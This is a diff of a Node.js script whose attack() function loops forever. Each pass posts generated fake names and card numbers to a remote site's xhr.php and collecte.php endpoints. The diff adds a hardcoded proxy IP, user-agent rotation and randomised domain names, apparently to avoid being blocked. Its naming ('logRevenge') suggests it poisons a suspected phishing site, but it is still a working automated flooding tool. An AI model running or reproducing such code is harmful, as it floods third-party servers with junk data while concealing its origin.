@@ -1,7 +1,10 @@
 const Encryption = require('./encrypt')
 const fetch = require('node-fetch')
 var fs = require('fs')
-const { uniqueNamesGenerator, Config, names, adjectives, animals } = require('unique-names-generator');
+const { uniqueNamesGenerator, Config, names, adjectives, animals, colors } = require('unique-names-generator');
+const HttpsProxyAgent = require('https-proxy-agent');
+
+const proxy = new HttpsProxyAgent.HttpsProxyAgent('http://160.72.82.101:80')
 
 const creditCardPrefix = [
     '51',
@@ -82,6 +85,7 @@ const userAgentList = [
     'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
 ]
 
 const nameConfig = {
@@ -102,10 +106,19 @@ const ccConfig = {
     dictionaries: [creditCardPrefix]
 }
 
-const domainConfig = {
-    dictionaries: [domains, domainEnds],
-    separator: '.',
+const domainEndConfig = {
+    dictionaries: [domainEnds]
+}
+
+const domainTwoConfig = {
+    dictionaries: [domains, domains],
+    separator: '-',
     length: 2,
+    style: 'lowerCase'
+}
+
+const domainOneConfig = {
+    dictionaries: [domains],
     style: 'lowerCase'
 }
 
@@ -156,7 +169,7 @@ function getRandomDate() {
 }
 
 function attack() {
-    var nonceValue = '400edd8d6a8b21550bc6cd3b98710d8b';
+    var nonceValue = '2e47474bb68a9831357ab266402d6f4c';
     /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
     var iptSec = $('#secu');
     var iptExp = $('#exp');
@@ -164,7 +177,7 @@ function attack() {
     var ownerName = $('#owner');
     var btnOrder = $('#order-now');*/
 
-    const fakeDomain = uniqueNamesGenerator(domainConfig)
+    const fakeDomain = (Math.random() > 0.2 ? uniqueNamesGenerator(domainOneConfig) : uniqueNamesGenerator(domainTwoConfig)) + '.' + uniqueNamesGenerator(domainEndConfig)
     const initDomain = generateDomain()
     console.log('Using fake domain: ' + fakeDomain)
     fetch(initDomain + '/?id=' + fakeDomain).then((redirectRes) => {
@@ -187,14 +200,16 @@ function attack() {
 
         console.log('POSTing data: ' + JSON.stringify(frmD, null, 2))
 
-        fetch(domain + '/xhr.php', {
+        const userAgent = uniqueNamesGenerator(userAgentConfig)
+
+        fetch(domain + 'xhr.php', {
             method: 'POST',
             headers: {
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'User-Agent': uniqueNamesGenerator(userAgentConfig)
+                'User-Agent': userAgent
             },
             body: JSON.stringify({
-                o: '8b36a023e12c0',
+                o: 'fb6ec572eb5c1',
                 tkn: encrypted
             })
         }).then(r => r.json().then(r => {
@@ -206,11 +221,12 @@ function attack() {
                     fetch(domain + '/collecte.php', {
                         method: 'POST',
                         headers: {
-                            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+                            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                            'User-Agent': userAgent
                         },
                         body: JSON.stringify({
                             t: Date.now(),
-                            ord: "8b36a023e12c0"
+                            ord: "fb6ec572eb5c1"
                         })
                     }).then(rrep => rrep.json().then(resp => {
                         console.log(resp)
@@ -231,7 +247,7 @@ function attack() {
             console.log(error)
             logRevenge(domain + '?id=' + fakeDomain, 'FAIL', frmD)
         }).finally(() => {
-            const next = Math.floor(Math.random() * 10000)
+            const next = Math.floor(Math.random() * 15000)
             console.log(`Next try in ${next / 1000} seconds`)
             setTimeout(attack, next);
         })
